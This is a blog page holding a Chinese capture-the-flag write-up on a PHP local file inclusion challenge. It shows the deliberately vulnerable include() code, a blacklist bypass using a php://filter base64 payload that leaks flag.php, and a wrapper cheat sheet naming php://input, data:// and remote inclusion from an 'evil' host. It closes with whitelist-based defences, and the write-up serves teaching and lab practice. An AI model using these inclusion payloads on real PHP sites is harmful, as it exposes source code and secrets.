@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web安全 · 文件包含 + php://filter 伪协议 WriteUp —「蒋璐源的秘密」 · pressure-J</title>
+<meta name="description" content="原因：php://filter/... 是参数的值，不是路径。直接拼在 URL 路径里，nginx 会去找一个名为 php: 的目录，当然 404。">
+<meta name="author" content="pressure-J">
+<meta name="color-scheme" content="dark light">
+<link rel="canonical" href="https://pressure-j.github.io/posts/web-an-quan-wen-jian-bao-han-php-filter-wei-xie-yi-writeup-jiang-lu.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Web安全 · 文件包含 + php://filter 伪协议 WriteUp —「蒋璐源的秘密」 · pressure-J">
+<meta property="og:description" content="原因：php://filter/... 是参数的值，不是路径。直接拼在 URL 路径里，nginx 会去找一个名为 php: 的目录，当然 404。">
+<meta property="og:site_name" content="pressure-J">
+<meta name="twitter:card" content="summary">
+<link rel="alternate" type="application/rss+xml" title="pressure-J" href="../rss.xml">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡</text></svg>">
+<link rel="stylesheet" href="../assets/style.css">
+<link rel="stylesheet" href="../assets/highlight.css">
+<script>
+(function() {
+  try {
+    var t = localStorage.getItem('theme');
+    if (!t) t = window.matchMedia('(prefers-color-scheme: light)').matches ? 'light' : 'dark';
+    document.documentElement.setAttribute('data-theme', t);
+  } catch (e) {}
+})();
+</script>
+</head>
+<body class="has-toc">
+<div class="progress-bar" id="progress"></div>
+<header class="site-header">
+  <div class="wrap header-inner">
+    <a class="brand" href="../index.html">
+      <span class="brand-mark">$</span><span class="brand-name">pressure-J</span><span class="brand-caret">_</span>
+    </a>
+    <nav class="site-nav" id="site-nav"><a href="../index.html">首页</a><a href="../posts.html" class="on">文章</a><a href="../category/index.html">分类</a><a href="../about.html">关于</a></nav>
+    <div class="header-tools">
+      <a class="icon-btn" href="../posts.html#search" aria-label="搜索">
+        <svg viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.6-3.6"/></svg>
+      </a>
+      <button class="icon-btn" id="theme-toggle" type="button" aria-label="切换主题">
+        <svg class="i-sun" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4.4"/><path d="M12 2.2v2.2M12 19.6v2.2M2.2 12h2.2M19.6 12h2.2M4.9 4.9l1.6 1.6M17.5 17.5l1.6 1.6M19.1 4.9l-1.6 1.6M6.5 17.5l-1.6 1.6"/></svg>
+        <svg class="i-moon" viewBox="0 0 24 24" width="17" height="17" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round"><path d="M21 12.9A8.6 8.6 0 1 1 11.1 3a6.6 6.6 0 0 0 9.9 9.9z"/></svg>
+      </button>
+      <button class="icon-btn menu-btn" id="menu-btn" type="button" aria-label="菜单" aria-expanded="false">
+        <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 6h18M3 12h18M3 18h18"/></svg>
+      </button>
+    </div>
+  </div>
+</header>
+<main class="wrap post-layout">
+  <div class="post-main">
+    <nav class="breadcrumb">
+      <a href="../index.html">首页</a><span>/</span>
+      <a href="../category/web.html">Web 安全</a>
+    </nav>
+    <article class="post">
+      <header class="post-header">
+        <h1>Web安全 · 文件包含 + php://filter 伪协议 WriteUp —「蒋璐源的秘密」</h1>
+        <div class="post-meta">
+          <span class="cat-badge cat-web">Web 安全</span>
+          <time datetime="2026-10-05">2026-10-05</time>
+          <span>7328 字</span>
+          <span>约 19 分钟</span>
+        </div>
+        
+      </header>
+      <div class="content"><blockquote>
+<p>目标：<code>http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/</code><br />
+环境：PHP 7.3.11，openresty/nginx 前端<br />
+考点：本地文件包含（LFI）+ <code>php://filter</code> 读取 PHP 源码<br />
+flag：<code>CTF2{7e180069-b246-4162-8b00-195e8f92a548}</code></p>
+</blockquote>
+<hr />
+<h2 id="url-404">一、关于你给的 URL 为什么 404</h2>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>http://.../php://filter/read=convert.base64-encode/resource=action.php
+→ 404 Not Found (nginx/1.16.1)
+</code></pre></div></div>
+
+<p><strong>原因</strong>：<code>php://filter/...</code> 是<strong>参数的值</strong>，不是路径。直接拼在 URL 路径里，nginx 会去找一个名为 <code>php:</code> 的目录，当然 404。</p>
+<p>正确形态是把它塞进某个会做文件包含的参数，比如：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre></div></div>
+
+<blockquote>
+<p>记住：<strong>伪协议永远出现在参数值里</strong>，它的"宿主"是 <code>include()</code> / <code>file_get_contents()</code> / <code>fopen()</code> 这类函数。</p>
+</blockquote>
+<hr />
+<h2 id="_1">二、信息收集（一路点出来的）</h2>
+<p>这题是一条链式页面，顺着点即可：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>/                      → 首页"你想知道蒋璐源的秘密么？"
+                         链接指向 ./Archive_room.php
+/Archive_room.php      → "绝密档案"，链接指向 ./action.php
+/action.php            → 302 跳转 Location: end.php
+                         但 HTML 里藏了注释  &lt;!-- secr3t.php --&gt;
+/end.php               → "查阅结束 / 没看清么？回去再仔细看看吧"（诱导回头）
+/secr3t.php            → ★ 真正的漏洞点
+</code></pre></div></div>
+
+<p><strong>关键在 <code>action.php</code></strong>：它既跳转又留注释，是典型的"障眼法"——只看跳转就走到死路，必须看源码才能发现 HTML 注释里的 <code>secr3t.php</code>。</p>
+<h3 id="_2">⚠️ 坑点：跳转页面怎么看源码？</h3>
+<p>访问 <code>action.php</code> 会瞬间跳到 <code>end.php</code>，很多人第一反应是 Ctrl+U 看源码，结果看到的是 <code>end.php</code> 的内容。<strong>正确姿势是"看第一跳的响应，而不是跟着跳走"。</strong></p>
+<p><strong>核心原理</strong>：302 跳转是<strong>响应头</strong> <code>Location:</code> 完成的——浏览器已经完整收到了 <code>action.php</code> 的响应（含注释），只是它看到 <code>Location</code> 后又自动发了一个请求。你要的是<strong>第一个响应</strong>。</p>
+<p><strong>❌ Chrome DevTools 做不到（重要）</strong></p>
+<p>在 Network 面板点 <code>action.php</code> → 响应，Chrome 会显示：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>无法加载响应数据
+没有可用的内容，因为此请求已重定向
+</code></pre></div></div>
+
+<p><strong>这不是操作错误，是 Chrome 的限制</strong>：它收到 302 后会丢弃响应体，DevTools 里只保留头信息。换 <code>预览</code> 标签同样为空；<code>标头</code> 只能看到 <code>Location: end.php</code>。</p>
+<p>实测确认（用禁止跟随重定向的方式请求，body 其实在里面）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>状态码 : 302
+Location: end.php
+--- 响应体（原始，不跟随跳转）---
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;!--
+   secr3t.php
+--&gt;
+&lt;/html&gt;
+</code></pre></div></div>
+
+<p><strong>✅ 方法一：Burp Suite（推荐，可看到内嵌图形界面）</strong></p>
+<ol>
+<li>Burp → <strong>Proxy → Intercept</strong> → 确认 <strong>Intercept is on</strong></li>
+<li>浏览器访问 <code>action.php</code></li>
+<li>Burp 把 302 <strong>拦在中间</strong>，跳转在放行前不发生</li>
+<li>直接在 Response 区域看到注释里的 <code>secr3t.php</code></li>
+</ol>
+<blockquote>
+<p>Burp 是"拦截"而非"跟随"，天然能看 302 响应体，这正是 DevTools 做不到的。</p>
+</blockquote>
+<p><strong>✅ 方法二：curl 不加 <code>-L</code></strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="c1"># 不加 -L → 停在第一跳，拿到 action.php 的响应体（含注释）</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/action.php
+
+<span class="c1"># 加 -L → 跟随到 end.php，看到的是"查阅结束"（死路）</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-iL<span class="w"> </span>http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/action.php
+</code></pre></div></div>
+
+<p><strong>✅ 方法三：Python 禁止自动重定向</strong></p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span>
+
+<span class="k">class</span><span class="w"> </span><span class="nc">NoRedirect</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">HTTPRedirectHandler</span><span class="p">):</span>
+    <span class="k">def</span><span class="w"> </span><span class="nf">redirect_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">k</span><span class="p">):</span>
+        <span class="k">return</span> <span class="kc">None</span>                    <span class="c1"># None = 不跟随跳转</span>
+
+<span class="n">opener</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">NoRedirect</span><span class="p">)</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">opener</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">"http://.../action.php"</span><span class="p">)</span>
+<span class="k">except</span> <span class="n">urllib</span><span class="o">.</span><span class="n">error</span><span class="o">.</span><span class="n">HTTPError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">e</span>                              <span class="c1"># 302 会抛 HTTPError，但响应可读</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">status</span><span class="p">,</span> <span class="n">r</span><span class="o">.</span><span class="n">headers</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"Location"</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>               <span class="c1"># ← 注释在这里</span>
+</code></pre></div></div>
+
+<p><strong>各种方法对比</strong></p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>能否看到 302 响应体</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network → 响应 / 预览</td>
+<td>❌ Chrome 主动丢弃</td>
+</tr>
+<tr>
+<td>Network → 标头</td>
+<td>⚠️ 只有 <code>Location</code></td>
+</tr>
+<tr>
+<td><code>view-source:</code> / Ctrl+U</td>
+<td>⚠️ Chrome 会跟随，看到的是 <code>end.php</code></td>
+</tr>
+<tr>
+<td>禁用 JavaScript</td>
+<td>❌ 这是 HTTP 头跳转，与 JS 无关</td>
+</tr>
+<tr>
+<td>按 Esc 停止加载</td>
+<td>❌ 跳转太快，不可靠</td>
+</tr>
+<tr>
+<td><strong>Burp Intercept</strong></td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>curl 不加 <code>-L</code></strong></td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>Python 禁重定向</strong></td>
+<td>✅</td>
+</tr>
+<tr>
+<td><strong>Postman（关自动重定向）</strong></td>
+<td>✅</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>心法</strong>：</p>
+<blockquote>
+<p>跳转只是浏览器"自动发起第二个请求"的行为，第一个响应随时能看到。<br />
+凡是遇到"点了就跳走、想看它返回了什么"，浏览器 DevTools 都不可靠，直接上 <strong>Burp / curl / Postman</strong> 这类"能停住跳转"的工具。<br />
+实战习惯：遇到跳转接口别急着跟过去，先看第一跳响应里有没有藏东西（注释、<code>Location</code> 指向、自定义响应头）。</p>
+</blockquote>
+<hr />
+<h2 id="_3">三、漏洞源码</h2>
+<p>访问 <code>/secr3t.php</code>，它用 <code>highlight_file(__FILE__)</code> 把自己的源码印出来：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+    <span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+    <span class="k">if</span><span class="p">(</span> <span class="nb">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"../"</span><span class="p">)</span>
+     <span class="o">||</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"tp"</span><span class="p">)</span>
+     <span class="o">||</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"input"</span><span class="p">)</span>
+     <span class="o">||</span> <span class="nb">stristr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"data"</span><span class="p">)</span> <span class="p">){</span>
+        <span class="k">echo</span> <span class="s2">"Oh no!"</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="c1">//flag放在了flag.php里</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>两个要点：</strong><br />
+1. <code>include($file)</code> —— 用户可控参数直接进文件包含，<strong>典型的 LFI</strong>。<br />
+2. 注释明说：<strong>flag 在 <code>flag.php</code> 里</strong>。</p>
+<hr />
+<h2 id="flagphp">四、为什么不能直接读 flag.php</h2>
+<h3 id="1-flagphp-flag">1. 直接访问 <code>/flag.php</code> 看不到 flag</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>$<span class="w"> </span>curl<span class="w"> </span>http://.../flag.php
+→<span class="w"> </span>页面显示了<span class="w"> </span><span class="s2">"我就在这里"</span>，但<span class="w"> </span><span class="nv">$flag</span><span class="w"> </span>变量的值没有输出！
+</code></pre></div></div>
+
+<p>因为 <strong>PHP 文件被 <code>include</code>/访问时会被解析执行，<code>&lt;?php ... ?&gt;</code> 里的代码不会作为文本输出</strong>。<code>flag.php</code> 里只有一句 <code>echo "我就在这里";</code> 和一个赋值给 <code>$flag</code> 的字符串变量——变量赋值不产生任何输出，所以你看不到 flag。</p>
+<h3 id="2">2. 黑名单挡住了常规绕过</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>被禁字符串</th>
+<th>检查函数</th>
+<th>含义</th>
+<th>封死了什么</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>../</code></td>
+<td><code>strstr</code>（区分大小写）</td>
+<td>目录穿越</td>
+<td><code>../flag.php</code> → <strong>Oh no!</strong></td>
+</tr>
+<tr>
+<td><code>tp</code></td>
+<td><code>stristr</code>（不区分大小写）</td>
+<td>协议名里的 <code>ht**tp**</code>/<code>ph**p**...</code></td>
+<td><strong>所有带 <code>tp</code> 的伪协议被拦</strong></td>
+</tr>
+<tr>
+<td><code>input</code></td>
+<td><code>stristr</code></td>
+<td>—</td>
+<td><code>php://input</code> → <strong>Oh no!</strong></td>
+</tr>
+<tr>
+<td><code>data</code></td>
+<td><code>stristr</code></td>
+<td>—</td>
+<td><code>data://</code> → <strong>Oh no!</strong></td>
+</tr>
+</tbody>
+</table></div>
+<p>实测：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>?file=flag.php                                        → 无回显（被当 PHP 解析）
+?file=../flag.php                                     → Oh no!        (../)
+?file=php://input                                     → Oh no!        (tp + input)
+?file=data://text/plain,&lt;?php phpinfo();?&gt;            → Oh no!        (tp + data)
+?file=http://x.com/a.php                              → Oh no!        (tp)
+?file=/var/www/html/flag.php                          → 无回显（绝对路径能读，但仍被 PHP 解析）
+</code></pre></div></div>
+
+<p><strong>这题的精妙之处</strong>：<code>tp</code> 被禁 → <code>php://</code>、<code>http://</code>、<code>ftp://</code> 全封 → 只剩 <code>file://</code>、<code>zip://</code>、<code>phar://</code> 等少数选择；<code>input</code>/<code>data</code> 被禁 → 无法拿 shell。<strong>看似只剩"读文件"这一条路——而这正好引导你到 <code>php://filter</code>。</strong></p>
+<hr />
+<h2 id="phpfilter">五、破题：<code>php://filter</code> 为什么能绕过</h2>
+<h3 id="_4">关键矛盾</h3>
+<p><code>php://filter</code> 里也含 <code>tp</code> 字样（<code>ph**p://**filter</code> 里没有连续 tp？见下）——等等，<code>php://filter</code> 这串里有没有 <code>tp</code>？</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>p h p : / / f i l t e r
+</code></pre></div></div>
+
+<p>没有 <code>t</code> 后面紧跟 <code>p</code> 的组合（<code>p://f</code> 中 p 在 t 前面）。<strong>这就是它能绕过 <code>tp</code> 黑名单的原因</strong>：<code>php://filter</code> 里不存在连续的 <code>tp</code> 子串。</p>
+<p>对比：</p>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>伪协议</th>
+<th>是否含 <code>tp</code></th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://</code></td>
+<td><code>ht**tp**</code> ✅含</td>
+<td>被拦</td>
+</tr>
+<tr>
+<td><code>ftp://</code></td>
+<td><code>f**tp**</code> ✅含</td>
+<td>被拦</td>
+</tr>
+<tr>
+<td><code>php://input</code></td>
+<td>无 tp，但含 <code>input</code></td>
+<td>被拦</td>
+</tr>
+<tr>
+<td><strong><code>php://filter</code></strong></td>
+<td><strong>不含 <code>tp</code>，不含 input/data</strong></td>
+<td>✅ <strong>放行</strong></td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="phpfilter_1">php://filter 的工作原理</h3>
+<p><code>php://filter</code> 是一个<strong>流过滤器</strong>，它让你在"文件被读取"和"被交给 PHP 处理"之间插入一层转换。核心语法：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>php://filter/&lt;过滤器链&gt;/resource=&lt;目标文件&gt;
+</code></pre></div></div>
+
+<p>本题用的是 <code>convert.base64-encode</code>：</p>
+<div class="code-block" data-lang="python"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>php://filter/convert.base64-encode/resource=flag.php
+</code></pre></div></div>
+
+<p>执行顺序是这样的：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>include("php://filter/convert.base64-encode/resource=flag.php")
+   ↓
+读取 flag.php 的【原始字节】（不解析 PHP）  ← 关键！
+   ↓
+整段内容做 base64 编码
+   ↓
+编码后的字符串交给 include 当 PHP 源码解析
+   ↓
+base64 是纯文本、不含 &lt;?php，所以 PHP 找不到标记 → 直接原样输出
+   ↓
+浏览器看到一串 base64 字符串
+</code></pre></div></div>
+
+<p><strong>一句话本质</strong>：base64 编码把源码"洗"成没有 <code>&lt;?php</code> 标记的纯文本，于是 PHP 引擎不再执行它，而是把它当普通内容输出——<strong>从而绕过"PHP 文件会被解析"这个障碍，拿到源码</strong>。</p>
+<hr />
+<h2 id="payload">六、最终 Payload</h2>
+<div class="code-block" data-lang="php"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>http://eef5e8f65a3a4346d49a7773.http-ctf2.dasctf.com/secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php
+</code></pre></div></div>
+
+<blockquote>
+<p><code>read=convert.base64-encode</code> 和省略 <code>read=</code> 的 <code>convert.base64-encode</code> 都可行（不写方向默认是读）。你给的 URL 里带 <code>read=</code> 是规范写法。</p>
+</blockquote>
+<p>回显（base64 串）：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code>PCFET0NUWVBFIGh0bWwKCgo8aHRtbD4K...（很长一段）
+</code></pre></div></div>
+
+<p><strong>解码</strong>（浏览器 Console 里一行搞定）：</p>
+<div class="code-block" data-lang="bash"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="nx">atob</span><span class="p">(</span><span class="s2">"粘贴base64串"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>或命令行：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">'PCFET0N...'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d
+</code></pre></div></div>
+
+<p><strong>解码后</strong>：</p>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>啊哈！你找到我了！可是你看不到我QAQ~~~<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="cp">    echo "我就在这里";</span>
+<span class="cp">    $flag = 'CTF2{7e180069-b246-4162-8b00-195e8f92a548}';</span>
+<span class="cp">    $secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><strong>flag = <code>CTF2{7e180069-b246-4162-8b00-195e8f92a548}</code></strong></p>
+<blockquote>
+<p>顺带一提，<code>$secret = 'jiAng_Luyuan_w4nts_a_g1rIfri3nd'</code>（蒋璐源想要个女朋友）是出题人留的彩蛋，不是 flag，别混淆。</p>
+</blockquote>
+<hr />
+<h2 id="_5">七、知识点沉淀</h2>
+<h3 id="1-include">1. <code>include()</code> 的两种行为，是本题的核心矛盾</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>读入方式</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>include('flag.php')</code></td>
+<td>文件被<strong>当 PHP 代码解析</strong>，<code>&lt;?php ?&gt;</code> 内容不输出 → 看不到源码</td>
+</tr>
+<tr>
+<td><code>include('php://filter/.../resource=flag.php')</code></td>
+<td>读到的是<strong>编码后的文本</strong>，PHP 引擎不认 → 原样输出</td>
+</tr>
+</tbody>
+</table></div>
+<p><strong>PHP 源码审计里，"能读文件"和"能看到源码"是两回事。</strong></p>
+<h3 id="2-php">2. PHP 常见伪协议与用途速查</h3>
+<div class="table-wrap"><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>语法</th>
+<th>用途</th>
+<th>前提</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>php://filter</code></td>
+<td><code>php://filter/convert.base64-encode/resource=x.php</code></td>
+<td><strong>读源码</strong>（绕过 PHP 解析）</td>
+<td>allow_url_include 无关，读本地即可</td>
+</tr>
+<tr>
+<td><code>php://input</code></td>
+<td><code>php://input</code> + POST body</td>
+<td>执行 POST 数据里的代码</td>
+<td><code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td><code>data://text/plain,&lt;?php ...?&gt;</code></td>
+<td>直接执行</td>
+<td><code>allow_url_include=On</code></td>
+</tr>
+<tr>
+<td><code>file://</code></td>
+<td><code>file:///etc/passwd</code></td>
+<td>读本地文件</td>
+<td>—</td>
+</tr>
+<tr>
+<td><code>phar://</code></td>
+<td><code>phar://x.zip/a.php</code></td>
+<td><strong>反序列化</strong>/读压缩包内文件</td>
+<td>需可上传文件</td>
+</tr>
+<tr>
+<td><code>zip://</code></td>
+<td><code>zip://x.zip%23a.php</code></td>
+<td>读 zip 内文件</td>
+<td>需可上传文件</td>
+</tr>
+<tr>
+<td><code>http://</code></td>
+<td><code>http://evil/a.php</code></td>
+<td>远程包含</td>
+<td><code>allow_url_include=On</code></td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="3">3. 黑名单绕过的思考方式</h3>
+<p>本题黑名单的设计很讲究：<br />
+- 禁 <code>../</code> → 挡目录穿越<br />
+- 禁 <code>tp</code> → <strong>一网打尽所有含 <code>tp</code> 的协议</strong>（这是最聪明的一刀，<code>ht**tp**</code>、<code>f**tp**</code> 全中）<br />
+- 禁 <code>input</code>、<code>data</code> → 挡拿 shell 的两条主路</p>
+<p><strong>绕过要点</strong>：黑名单是"枚举禁止项"，永远有遗漏。<code>php://filter</code> 里恰好不含 <code>tp</code> 子串，就从缝里钻过去了。</p>
+<blockquote>
+<p>反过来想：如果出题人把黑名单写成 <code>stristr($file, "php")</code>，那才是真的封死——<strong>说明写黑名单时"禁片段"比"禁协议名"更容易误伤和遗漏</strong>。</p>
+</blockquote>
+<h3 id="4">4. 长度/片段类字符串函数的坑</h3>
+<ul>
+<li><code>strstr($a, $b)</code>：<strong>区分大小写</strong></li>
+<li><code>stristr($a, $b)</code>：<strong>不区分大小写</strong></li>
+<li>两者都只看"是否包含子串"，无法应对编码/大小写/拼接绕过</li>
+</ul>
+<h3 id="5">5. 防御视角</h3>
+<div class="code-block" data-lang="text"><button class="copy-btn" type="button">复制</button><div class="highlight"><pre><span></span><code><span class="x">// 危险：用户输入直接进 include</span>
+<span class="x">include($_GET['file']);</span>
+
+<span class="x">// 相对安全：白名单 + 固定目录</span>
+<span class="x">$allow = ['a.php', 'b.php'];</span>
+<span class="x">$f = basename($_GET['file']);</span>
+<span class="x">if (!in_array($f, $allow, true)) die('no');</span>
+<span class="x">include(__DIR__ . '/pages/' . $f);</span>
+</code></pre></div></div>
+
+<ul>
+<li><strong>绝对不要</strong>让用户输入进 <code>include</code>/<code>require</code></li>
+<li>用<strong>白名单</strong>（枚举允许值），不要用黑名单</li>
+<li>关闭 <code>allow_url_include</code>、<code>allow_url_fopen</code></li>
+<li>上传目录禁止 PHP 执行；敏感文件不放 web 目录</li>
+</ul>
+<h3 id="6">6. 手工无工具全流程</h3>
+<ol>
+<li>首页 → 点链接 → <code>Archive_room.php</code></li>
+<li>访问 <code>action.php</code> → <strong>它 302 跳走，用 Burp 拦截 / curl 不加 <code>-L</code> 看第一跳响应</strong> → 发现 <code>&lt;!-- secr3t.php --&gt;</code>（关键一步，别跟着跳进 <code>end.php</code>）</li>
+<li>访问 <code>secr3t.php</code> → 读源码，看到 <code>include($file)</code></li>
+<li>地址栏改 <code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></li>
+<li>复制 base64 → <strong>F12 Console</strong> 里 <code>atob('...')</code> 解码 → 得到 flag</li>
+</ol>
+<blockquote>
+<p>第 2 步是本篇最大的坑（详见前文"坑点：跳转页面怎么看源码"）——Chrome DevTools 看不了 302 响应体。</p>
+</blockquote></div>
+      <div class="post-nav"><a class="pn-item prev" href="web-ji-chu-shu-zi-de-bu-tong-xie-fa-tong-pei-fu-zheng-ze-biao-da-shi.html"><span>← 上一篇</span><strong>Web基础 · 数字的不同写法 / 通配符 / 正则表达式</strong></a><a class="pn-item next" href="xun-huan-yi-huo-yi-zhi-ming-wen-qian-zhui-tui-mi-yao-zhou-qi-dasctf.html"><span>下一篇 →</span><strong>循环异或 · 已知明文前缀推密钥周期（DASCTF 深空信号站 KS-3）</strong></a></div>
+      <div class="post-end">
+        <a href="../posts.html">← 返回文章列表</a>
+        <a href="https://github.com/pressure-J" target="_blank" rel="noopener">在 GitHub 上找我</a>
+      </div>
+    </article>
+  </div>
+  <aside class="toc" id="toc">
+  <div class="toc-title">目录</div>
+  <nav><a href="#url-404" class="toc-lv2">一、关于你给的 URL 为什么 404</a><a href="#_1" class="toc-lv2">二、信息收集（一路点出来的）</a><a href="#_2" class="toc-lv3">⚠️ 坑点：跳转页面怎么看源码？</a><a href="#_3" class="toc-lv2">三、漏洞源码</a><a href="#flagphp" class="toc-lv2">四、为什么不能直接读 flag.php</a><a href="#1-flagphp-flag" class="toc-lv3">1. 直接访问 /flag.php 看不到 flag</a><a href="#2" class="toc-lv3">2. 黑名单挡住了常规绕过</a><a href="#phpfilter" class="toc-lv2">五、破题：php://filter 为什么能绕过</a><a href="#_4" class="toc-lv3">关键矛盾</a><a href="#phpfilter_1" class="toc-lv3">php://filter 的工作原理</a><a href="#payload" class="toc-lv2">六、最终 Payload</a><a href="#_5" class="toc-lv2">七、知识点沉淀</a><a href="#1-include" class="toc-lv3">1. include() 的两种行为，是本题的核心矛盾</a><a href="#2-php" class="toc-lv3">2. PHP 常见伪协议与用途速查</a><a href="#3" class="toc-lv3">3. 黑名单绕过的思考方式</a><a href="#4" class="toc-lv3">4. 长度/片段类字符串函数的坑</a><a href="#5" class="toc-lv3">5. 防御视角</a><a href="#6" class="toc-lv3">6. 手工无工具全流程</a></nav>
+</aside>
+</main>
+<footer class="site-footer">
+  <div class="wrap footer-inner">
+    <div class="footer-col footer-about">
+      <div class="footer-brand">pressure-J<span class="brand-caret">_</span></div>
+      <p>网络安全 · 应急响应 · 流量分析<br>写能复现、能讲清楚的东西。</p>
+    </div>
+    <div class="footer-col">
+      <div class="footer-title">导航</div>
+      <a href="../index.html">首页</a>
+      <a href="../posts.html">全部文章</a>
+      <a href="../category/index.html">分类</a>
+      <a href="../about.html">关于</a>
+    </div>
+    <div class="footer-col">
